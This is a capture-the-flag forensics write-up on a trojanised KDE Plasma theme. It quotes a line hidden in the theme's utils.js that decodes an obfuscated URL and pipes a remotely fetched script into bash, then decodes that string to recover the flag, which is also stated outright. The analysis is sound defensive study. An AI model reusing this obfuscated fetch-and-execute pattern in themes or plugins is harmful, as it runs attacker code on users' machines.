# Sp00kyTheme

## FLAG: HTB{pwn3d_by_th3m3s!?_1t_c4n_h4pp3n}

## Status: Complete

+ DOCKER: No
+ DOWNLOADABLE: Yes

Description: I downloaded a very nice haloween global theme for my Plasma installation and a couple of widgets! It was supposed to keep the bad spirits away while I was improving my ricing skills... Howerver, now strange things are happening and I can't figure out why...

## NOTES

1. Unzip challenge files
   1. > unzip forensics_sp00ky_theme.zip
      1. WOAH!! There are tons of files!!
2. APPROACH / GAMEPLAN
   1. I immediately start sorting through the files looking for things that have to do with actual code
      1. (ie. not .json files)
3. CODE FILES
   1. I ended up only finding two code files (both were javascript)
      1. org.kde.plasma.desktop-layout.js
      2. utils.js
   2. Starting with the layout.js file I didn't see anything in here that stood out
   3. BUUUT Going over to the utils.js file I found something useeful!
4. UTILS.JS

    ```js
        const PLASMOID_UPDATE_SOURCE = 
            "UPDATE_URL=$(echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d); curl $UPDATE_URL:1992/update_sh | bash"
    ```

    1. This string looks like base64, and plus looking into the command ran we see that it is infact base64!
    2. DECODE
       1. So we see several commands are ran and piped to one another
          1. First it looks like the string is piped to "rev" which reverses the string
          2. Then the reversed sting is piped to base64 -d (which is the decode function)
          3. Then it uses the curl command to reach out to the new UPDATED_URL/update.sh
5. REVERSE
   1. So lets do this
      1. > echo "952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS" | rev
         1. SFRCe3B3bjNkX2J5X3RoM20zcyE/XzF0X2M0bl9oNHBwM259
      2. > echo "SFRCe3B3bjNkX2J5X3RoM20zcyE/XzF0X2M0bl9oNHBwM259" | base64 -d
         1. HTB{pwn3d_by_th3m3s!?_1t_c4n_h4pp3n}
